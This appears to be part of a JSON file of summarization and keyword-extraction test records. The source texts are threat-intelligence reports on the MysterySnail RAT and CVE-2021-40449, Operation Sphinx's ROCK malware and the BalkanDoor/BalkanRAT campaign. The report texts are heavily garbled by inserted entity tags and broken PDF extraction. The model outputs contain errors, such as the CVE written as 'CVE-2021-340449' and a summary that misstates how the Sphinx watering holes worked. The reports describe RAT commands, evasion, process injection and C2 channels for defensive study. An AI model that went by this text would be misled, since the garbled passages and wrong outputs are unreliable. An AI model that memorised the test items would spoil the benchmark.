exploit attackers are able to achieve the desired state of memory with the use of GDI palette objects and use a single call to a kernel function to build a primitive for reading and writing kernel memory . This step is easily accomplished , because the exploit process is running with [ORG] Medium [ORG] IL and therefore it \u2019s possible to use publicly known techniques to leak kernel addresses of currently loaded drivers / kernel modules . In our opinion , it would be preferable if the [ORG] Medium [ORG] IL processes had limited access to such functions as NtQuerySystemInformation or EnumDeviceDrivers . [ORG] MysterySnail RATOur deep dive into the [ORG] MysterySnail RAT family started with an analysis of a previously unknown remote shell - type [GPE] Trojan that was intended to be executed by an elevation of privilege exploit . The sample which we analyzed was also uploaded to [GPE] VT on [DATE] August [DATE] 10 , [DATE] 2021 . The sample is very big \u2013 [CARDINAL] 8.29 MB . [CARDINAL] One of the reasons for the file size is that it \u2019s statically compiled with the OpenSSL library and contains unused code and data belonging to that library . But the main reason for its size is the presence of [CARDINAL] two very large functions that do nothing but waste processor clock cycles . These functions also \u201c use \u201d randomly generated strings that are also present in a binary . Random strings used by anti - analysis functionsWe assume these [CARDINAL] two functions are used as an AV - evasion technique for the purpose of anti- emulation . This theory is supported by the presence of other redundant logics and the presence of a relatively large number of exported functions while the real work is performed by [CARDINAL] only [CARDINAL] one of them.3/7Names of exported functions ; the actual business logic is executed from function \u201c GetInfo\u201dThe sample has [CARDINAL] two hardcoded URLs present in plain text \u2013 \u201c www[.]disktest[.]com \u201d and \u201c [WORK_OF_ART] www[.]runblerx[.]com \u201d . They are put into class variables for intended use , but remain unused ; the real C2 address is decoded by a single byte xor \u2013 \u201c http[.]ddspadus[.]com\u201d . The malware enumerates the values under the \u201c Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ProxyServer \u201d registry key and uses them to request tunneling through a proxy server in case it fails to connect to the C2 directly . The malware itself is not very sophisticated and has functionality similar to many other remote shells . But it still somehow stands out , with a relatively large number of implemented commands and extra capabilities like monitoring for inserted disk drives and the ability to act as a proxy . Inbound and outbound commands have the same binary - based format that is provided below . All communication is encrypted with SSL.Offset Description048Size of additional dataSession [ORG] IDCommand ID0xCAdditional dataFormat of communication commands4/7Before receiving any commands , the malware gathers and sends general information about the victim machine . This information includes : Computer name Current OEM code - page / default identifier Windows product name Local IP address Logged - in user name Campaign nameOne interesting fact is that \u201c Campaign name \u201d by default is set to \u201c windows \u201d . This name gets overwritten , but it might indicate there are versions of the same RAT compiled for other platforms . In total , the [ORG] RAT implements [CARDINAL] 20 commands . Their description and command IDs are provided in the table below . Command IDDescription1F4h1F5h1F6h1F7h1F8h1FAh1FBh1FFh202h205h208h209h20AhLaunch interactive cmd.exe shell . Before launch cmd.exe is copied to the temp folder with a different nameSpawn new processSpawn new process ( console)Get existing disk drives and their type . This function also works in the background , checking for new drivesCreate ( upload ) new file . If a file exists , append data to itGet directory listKill arbitrary processDelete fileRead file . If the file is too big , async read operation can be stopped with cmd [DATE] 20Ch . Re - connectSet sleep time ( in ms)Shutdown network and [ORG] exitExit5/720Bh20Ch217h21Bh21Ch21Eh21FhKill interactive shell ( created with cmd [DATE] 1F4h)Terminate file reading operation ( started with cmd [CARDINAL] 202h)No operationOpen proxy\u2019ed connection to provided host . Up to [CARDINAL] 50 simultaneous connections are supported . Send data to proxy\u2019ed connectionClose all proxy connectionsClose requested proxy connectionList of commands supported by the RATThe analysis of the MysterySnail RAT helped us discover campaigns using other variants of the analyzed malware as well as study and document the code changes made to this tool over a six - month period . We provide more info about these variants and campaigns in our private report . With the help of [ORG] Kaspersky [ORG] Threat [ORG] Attribution [ORG] Engine ( [ORG] KTAE ) and the discovery of early variants of [ORG] MysterySnail RAT we were able to find direct code and functionality overlap with the malware attributed to the IronHusky actor . We were also able to discover the re - use of C2 addresses used in attacks by the [NORP] Chinese - speaking [ORG] APT as far back as [DATE] 2012 . This discovery links IronHusky to some of the older known activities . Kaspersky products detect the CVE-2021 - 40449 exploit and related malware with the verdicts : [ORG] PDM : [GPE] Exploit . Win32.Generic [ORG] PDM : [GPE] Trojan . Win32.Generic [ORG] Trojan . Win64.Agent*Kaspersky products detected these attacks with the help of [ORG] the [ORG] Behavioral [ORG] Detection [ORG] Engine and the Exploit Prevention component . CVE-2021 - 40449 is the latest addition to the long list of zero - days discovered in the wild with the help of our technologies . We will continue to improve defenses for our users by enhancing technologies and working with [ORDINAL] third - party vendors to patch vulnerabilities , making the internet more secure for everyone . More information about these attacks and the actor behind them is available to customers of [ORG] the [ORG] Kaspersky [ORG] Intelligence [ORG] Reporting service . Contact : intelreports@kaspersky.com . [PERSON] Kaspersky would like to thank [ORG] Microsoft for their prompt analysis of the report and patches.6/7IoCswww[.]disktest[.]com www[.]runblerx[.]com", "generated_text": "Kaspersky; attacks; multiple Microsoft Windows servers; the zero-day; use; a vulnerability; the Win32k driver; use; an attacker; calls; a user-mode callback; the exploit; the victim; the server; code similarity; Chinese APT; IronHusky; Attacks; 2008; Windows 10; the exploit; CVE-2021-340449; a use-after-free vulnerability; the Win32k kernel driver; the vulnerability; two calls; a new DC; the PDC object; the C2 network; the port; the victim; C2 infrastructure; the exploitation; a new DC; the payload; variants; the exploit; China; APT activity; years; this cluster; the activity; exploitation.", "ref_text": "<START-1>The PDF describes cyberattacks by a threat actor dubbed MysterySnail that exploited a new Windows zero-day vulnerability. The zero-day exploit elevates privileges on Windows servers by targeting a use-after-free flaw in the Win32k kernel driver. Kaspersky discovered attacks using this exploit in late August 2021 and promptly reported it to Microsoft. Microsoft assigned CVE-2021-40449 to the vulnerability and patched it in the October 2021 Patch Tuesday update. The exploit supports a wide range of Windows versions including Server 2008 through 2019. Kaspersky believes it was sold as a server privilege escalation exploit. The attacks delivered a remote access trojan dubbed MysterySnail RAT that gathers system info and can execute commands. The RAT has various anti-analysis features and tried to hide its C2 communications. Kaspersky connected these attacks to a Chinese-speaking advanced persistent threat actor called IronHusky. Evidence showed the group has been active since at least 2012, targeting IT companies, military contractors, and diplomatic entities. In summary, the PDF provides details on a new Windows zero-day exploit used by a sophisticated cyberespionage actor in attacks starting in August 2021. Kaspersky worked with Microsoft to patch the vulnerability used in the exploits. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.5283018867924528, "gpt3/lexical/rouge_rouge2": 0.18483412322274878, "gpt3/lexical/rouge_rougeL": 0.21698113207547168, "gpt3/lexical/rouge_rougeLsum": 0.21698113207547168, "gpt3_generated_text": ["The article discusses a series of attacks on multiple Microsoft Windows servers using a zero-day exploit. Kaspersky technologies detected these attacks and promptly reported them to Microsoft. The exploit was found to be using a previously unknown vulnerability in the Win32k driver and relied on a technique to leak the base addresses of kernel modules. The vulnerability was patched by Microsoft as part of the October Patch Tuesday. The article also highlights the discovery of a malware payload used alongside the zero-day exploit, which was found in widespread espionage campaigns targeting IT companies, military/defense contractors, and diplomatic entities. This cluster of activity has been named MysterySnail and has been linked to the actor known as IronHusky and Chinese-speaking APT activity dating back to 2012. The article provides technical details of the exploit and the exploitation process, including how the exploit allows an attacker to execute two calls to a user-mode callback, leading to the creation of a new DC and the exploitation of a use-after-free vulnerability in the Win32k kernel driver. The article also mentions code similarity and the reuse of C2 infrastructure as factors connecting these attacks to the Chinese APT activity. Overall, the article highlights the discovery and patching of a zero-day exploit and the associated espionage campaigns carried out by the MysterySnail group."]}, {"split_name": "test", "sample_id": "test_57", "prompt_text": "Extract the keywords: [PERSON] Sphinx ( [ORG] APT - C-15)Targeted cyber - attack in [LOC] the [LOC] Middle [LOC] EastTable [LOC] of Contents1 . Overview 3 2 . Payload Delivery 4 1 ) [GPE] Watering [GPE] Holes on Social Websites 4 Lure Documents 6 Self - camouflage [DATE] 8 [DATE] 3 . [PERSON] Malware [PERSON] Analysis [PERSON] - [PERSON] ROCK 9 Functionality Brief 9 3 ) C2 Communication 11 4 ) [PERSON] Attack [PERSON] Techniques [DATE] 13 [DATE] 4 . Correlation Analysis [DATE] 14 [DATE] 1 ) Attackers \u2019 Facebook Accounts 14 2 ) [PERSON] PDB [PERSON] Paths [DATE] 15 [DATE] 3 ) Lure Documents [DATE] 15 [DATE] 4 ) njRAT [DATE] 15 [DATE] 5 ) Geo - location of [CARDINAL] C2 [CARDINAL] 16 Appendix A : Sample Sources in [DATE] Hebrew [DATE] 17 Appendix B : Updated Detection Results of the Samples 18Timeline of the report [DATE] updatesApril 29 , [DATE] 2016 , brief report and sample analysis report were drafted . [DATE] May 12 , [DATE] 2016 , comprehensive analysis report was completed . [DATE] June [DATE] 20 , [DATE] 2016 , the public version of the report was updated.1 . OverviewOperation Sphinx is a cyber - espionage activity in [LOC] the [LOC] Middle [LOC] East . The main victims are political and military organizations in [GPE] Egypt , [GPE] Israel and possibly other countries . Sensitive data theft is what the attackers plotted for during the period from [DATE] June , [DATE] 2014 [DATE] to November , [DATE] 2015 when the activity was in its prime . We encountered some timestamps of the samples to be [DATE] as [DATE] early [DATE] as December , [DATE] 2011 which suggests the attack might be started much earlier , though further sound proof is needed . The main approach of [ORG] Sphinx is watering hole attack on social websites . Until now , we have obtained [CARDINAL] 314 pieces of sample malicious codes and 7 C2 domains . A common method attackers use to hide their trace is to cloak malicious exe files with Word or [ORG] PDF icons so that users will not tell the difference without looking into the file attribution or property . The [PERSON] Sphinx attackers adopt it as well , but they also attempt to conceal the attacks by making the master program \u201c invisible \u201d . In our analysis , [PERSON] Sphinx \u2019 master program was found to be disguised with Word icon in order to trap users to click . Upon clicking , the master program released several [ORG] DLL files . The files can be categorized into [CARDINAL] 9 types of plugin modules by functionality . The core [ORG] DLL fill could be self - started after registering as a plugin of the resource management panel . Then , based on different configurations , remote injection was triggered to inject other functional [ORG] DLL to corresponding running process . This way , when the malware was running , the master program had already been split into several imperceptible pieces . That decreases the risk for the targets to realize the existence of the malware . Multiple encryption algorithms were adopted simultaneously to hamper the detection . Seeing from the [ORG] PDB paths , we suspect that the attackers were using continuous integration tools , which indicts that the scale of operation may massive and the developers of the malware are professionals in relevant fields . Furthermore , we speculate that some [ORDINAL] third party organizations were involved in helping develop the malware to support [LOC] the [LOC] Middle [LOC] East \u2019s attackers.2 . [PERSON] Payload [PERSON] Delivery1 ) Watering Holes on [ORG] Social [ORG] WebsitesOne of the lure documents was found in the comments area on [ORG] Israeli [ORG] Army \u2019s Facebook . It shows the attackers took advantage of this social websites to deliver the payload because their targets often visit it . This is the watering hole that has been seen as compromise vector in many cyber - attacks . Traditionally , watering holes attacks can be categorized into [CARDINAL] two types by approach : a. Attackers will usually study and capture the website that their targets often visit . Then malware code ( usually the scripts exploit some vulnerability ) is directly embedded on the site . Now , the site is infected with [GPE] Trojan and the trap is ready for victims . When the targets visit the site and click infected pages , the malware will be implanted in their computer if the network environment matches attackers preset conditions.b . Attackers will capture a website and replace certain application or link on it with malicious download link . Once target visits the site and download the file in the link , malware will be implanted in the victim \u2019s computer . Typical cases are the [PERSON] Havex [PERSON] Trojan1 ( also known as [ORG] Dragonfly or Energetic Bear ) unrevealed in [DATE] 2014 and [ORG] OceanLotus in [DATE] late [DATE] May , 20152.The commonness the [CARDINAL] two approaches share is attackers need to obtain the authorization to modify the website they aim to capture . However , in [FAC] Sphinx attacks , it is much easier to get authorized to deploy the watering holes because they just need to simply register a Facebook account . That is all they need to be free to scatter malicious links in the comments \u2019 area . It is a new approach in setting up watering holes in [ORG] APT [ORG] attacks.1 [PERSON] Havex [PERSON] Hunts For ICS / SCADA [ORG] Systems , url The original exe icon has been replaced with a [ORG] PDF or [PERSON] Word icon to induce targets to click . Picture 2 Lure documents in [ORG] RAR file folderWith in - depth analysis , we found that [CARDINAL] 10 social website accounts in total were compromised in the attacks , including [ORG] Israeli [ORG] Army , [ORG] Israeli [ORG] Navy and other accounts related with [NORP] Israeli military and government . Malicious comments are intense from [DATE] late [DATE] January to [DATE] early [DATE] February in [DATE] 2015 . The content containing a malicious link are mostly about the aforementioned adjustments of individual income tax.*Please review [WORK_OF_ART] Appendix [WORK_OF_ART] A for a whole list of the sites . Picture 3 C2 domain took over by [ORG] Kaspersky using sinkhole technique2 ) Lure DocumentsThere are [CARDINAL] two types lure documents and the contents can tell [ORG] APT researchers what fields and geos the attackers were targeting.(A ) Egypt - ArabicPicture 4 Lure documents \u2013 [CARDINAL] 1In the original lure document3 , the [ORG] YouTube video links showing the arrests of students from Al [ORG] - Azhar [ORG] University that against the coup are included at the end of the file.3 hxxps://docs.google.com/file/d/0ByavzARTLomhc3hFeFhGN1JOOE0/edit?pli=1Picture 5 Lure Document \u2013 [CARDINAL] 2The name \u201c annonymous rabaa \u201d on the picture is an [NORP] Egyptian hacker group that compromise government official sites to protest the slaughter in [DATE] August , [GPE] 2013.(B ) [PERSON] Israel [PERSON] - [PERSON] HebrewThis document quotes the adjustments of [NORP] Israeli individual income tax . Picture 6 Lure document \u2013 [CARDINAL] 33 ) Self - camouflageThe malware either cloak itself with documentation and image icon , or with application icon . The picture below shows a fake [PERSON] Adobe [PERSON] Flash installer file . [ORG] Picture [ORG] 7 [ORG] Impersonation [ORG] of [ORG] a [ORG] documentPicture [ORG] 8 [ORG] Impersonation [ORG] of an Adobe Flash applicationWith the former approach , no document or image will pop - up upon clicking ; while with the latter approach , the legitimate installer file will be released after the malware finishes its installation . The [CARDINAL] 9 plugin modules are disguised as [ORG] Office components . In earlier version of the malware , the instance , C:\\Program Files\\{59f0641e-45ac-11e5 [ORG] - af9e - b8ca3af5855f } is a piece of malware that pretends to be a system component.is % UserProfile%\\AppData\\Roaming\\officeplugin . But to be under C:\\Program Files\\{GUID},forPicture 9 File Property of the Malware3 . [PERSON] Malware [PERSON] Analysis [PERSON] - [PERSON] ROCK1 ) [ORG] Functionality BriefROCK Trojan plays a main role in the [FAC] Sphinx attacks . This malware family was developed by the attackers themselves or was customer - made by a [ORDINAL] third party group . We also found a variant of the njRAT family in another sample which we will introduce in another chapter . The malware impersonated Word documents , images or installation programs in the attempt to disguise itself as [ORG] PDF files , pictures or Flash installers to induce the users to click . The main purpose is to steal sensitive information from the victims , such as system information , account & password and search history saved in the browser . It also monitors victims through [ORG] Skype chatting history , cameras , microphones and keyboard & mouse logging . The information collected will then be encrypted and passed back to specific C2 servers.2 ) InfrastructurePicture [CARDINAL] 10 Infrastructure of the malwareConfiguration data of all the modules is saved in JSON configuration file . The file decides , to name a few , whether to run the module or not , what encryption key to use on the data files , what pixels and intervals of the screenshots and audio recordings are required , as well we what running process the master program should be injected in . It also provides the user ID ( rkuid ) , due date , [CARDINAL] C2 address , etc . Picture 11 Modules and [ORG] FunctionalitiesThe dropper releases [CARDINAL] 20 [ORG] DLL files in total with [CARDINAL] ten 32 [QUANTITY] - bit and [CARDINAL] ten 64 - bit . Each module is composed of [CARDINAL] two versions to be compliant with 32 [QUANTITY] - bit and [CARDINAL] 64 - bit system . [PERSON] Module nameFunctionalityzcorezulibplgcmdplgcommplginputplgurlplgskypeplgavbugplgusrstlMaster programAPI function encapsulationObtain system info , screenshots , startup / end progressCommunicationMouse and keyboard loggingMonitor the content in web browser \u2019s ( IE , [ORG] FireFox , [ORG] Chrome ) address barSave and pass back Skype chatting history , screenshots and audio recordsMonitor through camera and microphone , send back the recordsSteal user information , including account name & password , search history , cookies , [ORG] Pidgin ( [ORG] IM software ) accountplgfsfltMonitor and pass back data of specific file types like doc , docx , ppt , pptx , xls , xlsx , odf , txt , pdf , rtf , jpg , jpeg , gif , pngWhen the master program Zcore is started , it decrypts the configuration file under installation directory and decides whether to inject into certain process according to the module status ( true / false ) in the configuration file . \uf06c [ORG] Zcore.dll core module : mainly responsible for loading other function modules and injecting them to certain process ; register , update and uninstall modules , distribute logs and [PERSON] messages\uf06c [PERSON] Plgcmd.dll command module : obtain system information , delete file and directory , takescreenshots , upload saved documents , start and end process.\uf06c [ORG] Plgcomm.dll communication module : transfer data generated and encrypted by other modules to specific C2 server . The module sends a request to the server per minute toacquire remote commands . The cross - process communication between each module is completed via [ORG] WM_COPYDATA messages . Every message begins with 0x34AB541 which is the unique identification . The body of the message is transferred in JSON codes.3 ) [CARDINAL] C2 CommunicationThe message is transferred in data package to server port [CARDINAL] 80 through [ORG] HTTP [ORG] POST . Sensitive strings in the package are replaced after querying the mapping table of JSON configuration file . Picture 1 C2 CommunicationPicture 13 Restored Strings of [CARDINAL] C2 CommunicationC2 communication modules is injected into the browser process and the port used to send data to [CARDINAL] C2 server is port [CARDINAL] 80 , these [CARDINAL] two methods perfectly cloak the attack among the normal traffic.4 ) [PERSON] Attack [PERSON] TechniquesRandom file names The module files are re - named randomly after being released by the [PERSON] Dropper and the names are stored in the JSON file ( usually nouns in [LANGUAGE] English , for instance , gendarme.dll , jerques.dll).Picture [CARDINAL] 14 File name of the modulesString Encryption All the strings are encrypted by several encryption algorithms . Picture [CARDINAL] 15 String EncryptionAPI function encapsulation A great amount of API functions ( over [CARDINAL] 300 ) are encapsulated in zulib ( a dynamic dll library ) to hamper static analysis from security software . Runtime without master program The core module is started up as an extension of explorer.exe . Other modules are injected into certain processes according to the configuration file . Therefore , there is no master program running during the malware runtime which makes the malicious activities hard to be noticed . Even though sometimes users may sense the abnormity , they would still relax their vigilance at last with checking attempt ending up in vain . Process injection The master module runs in a legitimate explorer which security software will not intercept . Communication module is usually injected into the browser process . But if there is no browser process , the malware will give up communicating with C2 server . The data theft module is injected into security software so as to make the malware \u2019s trace inconspicuous when it traverses [ORG] PE and config file encryption [ORG] PE files in the dropper are compressed by zlib and encrypted by [ORG] AES algorithms , as well as the configuration files released by the dropper . No matter on dynamic or static combat , the attack tactics indicts that these malware developers must have spent time and efforts studying security software to compile customer - made malware so as to avoid detection and cover its trace.4 . [PERSON] Correlation [PERSON] Analysis1 ) Attackers \u2019 Facebook AccountsAttackers \u2019 Facebook account url url url [CARDINAL] 99%D7%93%D7%94/100007696628947 url Facebook accounts played important roles in the watering hole attacks.2 ) PDB PathsPDB pathsC:\\Users\\user\\bamboo - agent - home\\xml - data\\build - dir\\ROCK - RW2 - BRW6R\\x64\\Release - RkLibDllZ:\\rootkits\\windows\\zico\\x64 Z:\\build\\rootkits\\windows\\zico\\Release We have the below discoveries based on [ORG] the [ORG] PDB [ORG] paths:\uf0b7\uf0b7\uf0b7The [ORG] ID of the developer is zico The name of the program is ROCK - RW2 - BRW6R The internal name used is rootkits3 ) Lure DocumentsFile NameEnglish\u0641\u0644 \u0645 \u062a\u0644\u0627 \u0642 \u062a \u0639 \u0645 \u0644\u0627 \u0629\u0639 \u0645\u0627 \u062c \u0628 \u0631 ( [CARDINAL] 1).pdf \u0629\u064a \u062c\u064a\u0643 \u0627\u0631\u062d \u0644\u0627\u062a\u0627\u0631\u062a \u0633 \u0627\u0647\u0632\u0644\u0627\u0627 \u0643 \u0641 \u0627\u0644\u0644\u0647 \u0646\u0647\u0631\u0633 \u0623\u064a\u0631\u0648\u062b\u0644\u0627\u0629 \u0645\u0648\u0627 \u0642 \u0645\u0644\u0644\u0629\u064a \u0628 \u0639 \u0634 \u0644\u0627\\File1.pdf\u05e1\u05de \u05d4\u05e1\u05e0 \u05db\u05d4 \u05ea\u05d3\u05d5 \u05db\u05dc\u05de\\\u05e1\u05de \u05d4\u05e1\u05e0 \u05db\u05d4- \u05dd\u05d9 \u05e0 \u05d5 \u05db\u05d3\u05e2.pdf\u0645 \u064a \u0638\u0646 \u062a \u062a\u0627 \u0639\u0648\u0645\u062c\u0645 \u0644\u0627 \u0629 \u064a\u0631\u0648\u062b \u0629\u0621\u0627 \u0646 \u064a \u0633 - \u0637\u0637\u062e\u0645\u064a\u0644\u0627\u0648\u0644\u0627\\File1.pdf \u0629 \u0631\u0637\u064a \u0633 \u0644\u0627\u0646\u0645\u0627 \u0643 \u0644\u0627\\\u0646 \u0645\u0627\u062f \u0631\u0627 \u0637\u0645 \u0644\u0627.pdf \u0629\u064a\u0644\u0627\u0648 \u0621\u0627 \u0646 \u064a \u0633 - \u0637\u0637\u062e\u0645\u0629 \u0631\u0637\u064a \u0633 \u0644\u0627 \u0646\u0645\u0627 \u0643 \u0644\u0627\\\u0647 \u064a \u062c\u0648 \u062a\u062a \u0627\u0631\u0627 \u064a \u0633 \u0644\u0627 \u0629\u062e\u062e\u0641 \u0645 \u0644\u0627 \u062f \u0636 \u064a \u0646\u0627 \u0628 \u0645 \u0644\u0627.pdf \u0629\u064a\u0644\u0627\u0648 \u0621\u0627 \u0646 \u064a \u0633 - \u0637\u0637\u062e\u0645\u0629 \u0631\u0637\u064a \u0633 \u0644\u0627 \u0646\u0645\u0627 \u0643 \u0644\u0627\\\u0629 \u0633\u062f \u0646 \u0647\u062a \u0627\u0631\u062c\u0641 \u062a \u0645 \u0644\u0627 \u0646\u0645 \u0646\u064a \u0637\u0633\u0644 \u0641.pdfofpeople\u2019sDetention of Al [ORG] - Azhar [ORG] University students the file may Allah free [ORG] them(1).pdf [ORG] Revolutionary movement resistance strategy / File1.pdf Adjustment on individual income tax.pdf [GPE] Organizing revolutionary groups / File1.pdf The state of the [ORG] Sinai - scheme / underlying security control [ORG] Chaser.pdf The state of the [ORG] Sinai - scheme / underlying car bombs directed against buildings control.pdf The state of the [ORG] Sinai - scheme / underlying in an Adobe.pdf icon . The remote control is a variant of njRAT malware family which is prevalent [PRODUCT] EgyptAppendix A : [ORG] Sample [ORG] Sources in [ORG] HebrewLinks to [ORG] Social [ORG] WebsitesSite [ORG] OwnersDateshxxps://www.facebook.com/320924244852/photos/pb.320924244852.-22075Shayetet [MONEY] 13 [MONEY] - Israeli9:01pm , [DATE] Jan. [DATE] 31 , [CARDINAL] 201520000.1449772632./10150705915184853/?type=3&theaterspecial forces [ORG] unithxxps://www.facebook.com/527045137305930/videos/918743024802804/Israel [ORG] Defense [ORG] Forces ( IDF)8:33pm , [DATE] Jan. [DATE] 31 , 2015hxxp://statuscope.co.il/%D7%9E%D7%99-%D7%94%D7%99%D7%90-%D7%94Israeli Navy11:15:25 , [DATE] Feb. [DATE] 4 , 2015%D7%99%D7%97%D7%99%D7%93%D7%94-%D7%94%D7%98%D7%9B%D7%A0%D7%95%D7%9C%D7%95%D7%92%D7%99%D7%AA-%D7%A9%D7%9C-%D7%96%D7%A8%D7%95%D7%A2-%D7%94%D7%99%D7%9D-%D7%90%D7%A9%D7%A8-%D7%96%D7%9B%D7%AA%D7%94-%D7%91%D7%AA%D7%97%D7%A8%D7%95%D7%AA?id = c917c8e2hxxps://www.facebook.com/555898814436639 / photos / a.556290817730772.Israelipolitical3:36pm , [DATE] Feb. [DATE] 2 , 2015145251.555898814436639/1019290754764107/?type=3&p=10commentarieshxxps://www.facebook.com / miri.regev.il / photos / a.538483556248464.10737Israeli Culture and Sports6:09pm , [DATE] Feb. [DATE] 3 , 201541833.118410851589072/751248248305326/?type=1&theaterMinister - Miri [NORP] Regevhxxps://www.facebook.com/maarivonline/videos/641901115916051/Israeli media - [GPE] Maariv6:22pm , [DATE] Feb. [DATE] 1 , [DATE] 2015Onlinehxxps://webcache.googleusercontent.com/search?q=cache:nBi1mbSVr4MJ:htCaracalBatallion-5:33 , [DATE] Jan. [DATE] 31 , 2015tps://www.facebook.com/%25D7%2592%25D7%2593%25D7%2595%25D7%2infantry combat battalion593-%25D7%25A7%25D7%25A8%25D7%25A7%25D7%259C-60398431629646of the IDF6/+&cd=6&hl = en&ct = clnk&gl = ushxxps://webcache.googleusercontent.com / search?q = cache : rtCajoBx_3QJ : httIsraeli [PERSON] Army2:14 , [DATE] Feb. [DATE] 1 , 2015ps://www.facebook.com/Israe.Army/+&cd=8&hl=en&ct=clnk&gl=ushxxps://www.facebook.com/%D7%97%D7%99%D7%9C-%D7%94%D7%99%DIsraeli [GPE] Navy9:00pm , [DATE] Jan. [DATE] 31 , 20157%9D-553700681378193 / hxxps://www.facebook.com / IAFGiyus / photos / a.364384073628468.82320.32Israeli [ORG] Air [ORG] ForceFeb . [CARDINAL] 3 , 20151086041291605/846002125466658/?type=1&theaterAppendix B : Updated Detection Results ofthe Samples", "generated_text": "Operation Sphinx; APT-C-15; the Middle East; political and military organizations; Egypt; Israel; other countries; Sensitive data theft; the attackers; Watering Holes; social websites; lure documents; the malware; the targets; a njRAT; a DLL; the malware; the njRAT; CO; the victims; use; a wide variety; attack techniques; analysis; the report; a sample; the C2; PDB paths; addition; detection; the capabilities; the investigation; the report; the malware; C2 domains; attribution; C2 communication; the analysis; indicators; compromise; the Middle East; the activities.", "ref_text": "<START-1>The PDF provides an analysis of a cyberespionage campaign called Operation Sphinx targeting political and military organizations in Egypt, Israel, and other countries in the Middle East. The main approach is watering hole attacks on social media sites like Facebook. The attackers compromise accounts related to the Israeli military and government and post malicious links in comments. The links download RAR files containing weaponized documents impersonating PDFs or Office files. When clicked, the documents drop malware modules that steal sensitive data and exfiltrate it to command and control servers. The main malware is called ROCK and has multiple components for keylogging, screen capture, Skype monitoring, etc. The modules are injected into different processes for stealth. Strings are encrypted and API calls obscured to evade detection. Lure documents suggest targeting of Egypt and Israel. Links between samples reveal associations with Egypt. The malware appears professionally developed, likely with help of third parties. The campaign was most active between mid-2014 and late 2015. The report aims to expose the tactics, techniques, and procedures used in this Middle East cyberespionage operation. It shows how social engineering is combined with advanced malware to target high-profile victims and steal sensitive data. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.44507042253521123, "gpt3/lexical/rouge_rouge2": 0.14730878186968838, "gpt3/lexical/rouge_rougeL": 0.24788732394366195, "gpt3/lexical/rouge_rougeLsum": 0.24788732394366195, "gpt3_generated_text": ["This article provides an overview of Operation Sphinx, a cyber-espionage activity targeting political and military organizations in the Middle East, specifically Egypt and Israel. The attackers aim to steal sensitive data and have been active since at least December 2011. The main method of attack used by Sphinx is a watering hole attack on social websites, where the attackers exploit vulnerabilities on these websites to deliver their malware. The malware is disguised as Word or PDF files and is capable of self-camouflaging and splitting into multiple DLL files to avoid detection. The attackers also use multiple encryption algorithms and continuous integration tools to conceal their activities. The article also discusses the delivery of the payload through watering holes on social websites, specifically how the attackers use Facebook accounts to scatter malicious links in the comments section. The article concludes by highlighting the new approach used by Sphinx in setting up watering holes in APT attacks."]}, {"split_name": "test", "sample_id": "test_58", "prompt_text": "Extract the keywords: [CARDINAL] 8/15/2019In the [LOC] Balkans , businesses are under \ufb01re from a doublebarreled weapon | WeLiveSecurityIn the [LOC] Balkans , businesses are under \ufb01re from a double\u2011barreled [DATE] weaponwelivesecurity.com/2019/08/14/balkans-businesses-double-barreled-weaponAugust [DATE] 14 , [CARDINAL] 2019ESET researchers discovered a campaign that uses [CARDINAL] two malicious tools with similar capabilities to ensure both resilience and broader potential for the attackersZuzana Hromcov\u00e1 [CARDINAL] 14 Aug [DATE] 2019 [DATE] - [DATE] 11:30AMWe\u2019ve discovered an ongoing campaign in the [LOC] Balkans spreading [CARDINAL] two tools having a similar purpose : a backdoor and a remote access trojan we named , respectively , [ORG] BalkanDoor and [NORP] BalkanRAT.BalkanRAT enables the attacker to remotely control the compromised computer via a graphical interface , i.e. , manually ; [ORG] BalkanDoor enables them to remotely control the compromised computer via a command line , i.e. , possibly en masse . ESET security products detect these threats as [ORG] Win{32,64}/BalkanRAT and Win32 / [ORG] BalkanDoor . A typical victim of this campaign , which uses malicious emails as its spreading mechanism , ends up having both these tools deployed on their computer , each of them capable of fully controlling the affected machine . This rather uncommon setup makes it possible for attackers to choose the most suitable method to instruct the computer to perform operations of their choice . The campaign \u2019s overarching theme is taxes . With the contents of the emails , included links and decoy PDFs all involving taxes , the attackers are apparently targeting the \ufb01nancial departments of organizations in the [LOC] Balkans region . Thus , although backdoors and other tools for remote access are often used for espionage , we believe that this particular campaign is \ufb01nancially motivated . The campaign has been active at least from [DATE] January [DATE] 2016 to the time of writing ( the most recent detections in our telemetry are from [DATE] July [DATE] 2019 ) . Some parts of the campaign were brie\ufb02y described by a [NORP] Serbian security provider in [DATE] 2016 and [ORG] the [ORG] Croatian [ORG] CERT in [DATE] 2017 . Each of these sources focused only on [CARDINAL] one of the [CARDINAL] two tools and only on a single country . However , our research shows that there is a signi\ufb01cant overlap in targets and also in the attackers \u2019 tactics , techniques and procedures . Our \ufb01ndings show that the mentioned attacks have been orchestrated and we consider them a single long - term campaign that spans [GPE] Croatia , [GPE] Serbia , [GPE] Montenegro , and [GPE] Bosnia [GPE] and [GPE] Herzegovina . Our research has also shed more light at the malware used in this campaign and provided some context . We \u2019ve discovered a new version of [ORG] BalkanDoor with a new method for execution / installation : an exploit of the WinRAR [ORG] ACE vulnerability ( CVE-2018 - 20250 ) . Further , we \u2019ve seen both malicious tools digitally signed with various certi\ufb01cates the developers paid for to add perceived legitimacy . [CARDINAL] One of them , issued to [ORG] SLOW [ORG] BEER [ORG] LTD , was even valid at the time of writing ; we \u2019ve noti\ufb01ed the issuer about the misuse and they revoked the certi\ufb01cate.url the [LOC] Balkans , businesses are under \ufb01re from a doublebarreled weapon | WeLiveSecurityIn this article , we will describe some notable features of both [GPE] BalkanDoor and BalkanRAT . Our analysis shows that the former runs as a Windows service , which allows it to unlock the [PRODUCT] Windows logon screen remotely and without the password or start a process with the highest possible privileges . The latter misuses a legitimate remote desktop software ( RDS ) product and uses extra tools and scripts to hide its presence from the victim , such as hiding the window , tray icon , process and so on . Targets and distribution Both BalkanRAT and [ORG] BalkanDoor spread in [GPE] Croatia , [GPE] Serbia , [GPE] Montenegro , and [GPE] Bosnia [GPE] and [GPE] Herzegovina . ( These countries , along with [GPE] Slovenia and former [GPE] Macedonia , formed the country of [GPE] Yugoslavia until [DATE] 1992.)Figure [DATE] 1 . [PERSON] Malware distribution by countryAccording to our telemetry , the campaign spreading these tools has been live since [DATE] 2016 , with the most recent detections [DATE] as [DATE] late [DATE] as [DATE] in [DATE] July 2019.The attackers have been distributing their tools via malicious emails ( \u201c malspam \u201d ) with links leading to a malicious \ufb01le . The links included in the malspam emails used 